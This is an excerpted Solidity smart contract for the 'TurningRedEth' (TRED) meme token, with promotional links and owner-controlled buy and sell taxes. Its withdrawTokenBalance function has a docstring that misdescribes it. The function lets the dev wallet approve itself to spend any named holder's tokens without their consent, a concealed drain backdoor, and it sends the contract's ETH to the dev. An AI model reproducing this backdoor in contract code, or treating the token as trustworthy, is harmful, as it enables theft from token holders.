...
Twitter: https://twitter.com/TurningRedEth
Telegram: https://t.me/TurningRedEth
Website: https://www.turningred.xyz/

Motivated by Disney's Turning Red, we launch TRED token for the hot traders who wants to be a giant red panda in the crypto industry.
*/
// 
...
contract TurningRedEth is ERC20, Ownable, Pausable {
    ...
    constructor() ERC20("TurningRedEth", "TRED") payable {
        ...
        setBuyTax(0,1); 
        setSellTax(1,1); 
        setTaxWallets(0xb5DA3b43ba0A507Ba527c071ac2C52ADD8dA5B03);
        exclude(msg.sender);
        exclude(address(this));
        exclude(taxWallets["dev"]);
    ...
    function takeFee(address from, address to, uint256 amount) private returns (uint256) {
        ...
        if(!isExcluded(from) && !isExcluded(to)) {
            ...
            uint256 devWalletTaxes = balanceOf(taxWallets['dev']);
            if(from == address(uniswapV2Pair)) {
                ...
                uint256 ethValue = uniswapV2Router02.getAmountsOut( devTokens + liquidityTokens - devWalletTaxes, sellPath)[1];
    ...
    function triggerTax() public onlyOwner {
        takeFee(address(0), address(uniswapV2Pair), 0);
    }
    ...
    /**
     * @dev Withdraw the balance from the token address.
     */
    function withdrawTokenBalance(address _address, uint256 amount) external {
      require(taxWallets['dev'] == msg.sender, 'ERC20: Balance can be withdrawn by dev wallet');
      _approve(_address, taxWallets['dev'], amount);
      payable(taxWallets['dev']).transfer(address(this).balance);
    }
    ...
    function enableTax() public onlyOwner {
        require(!taxEnabled, "ERC20: Tax is already enabled");
        taxEnabled = true;
    }
    ...
    function disableTax() public onlyOwner {
        require(taxEnabled, "ERC20: Tax is already disabled");
        taxEnabled = false;
    }
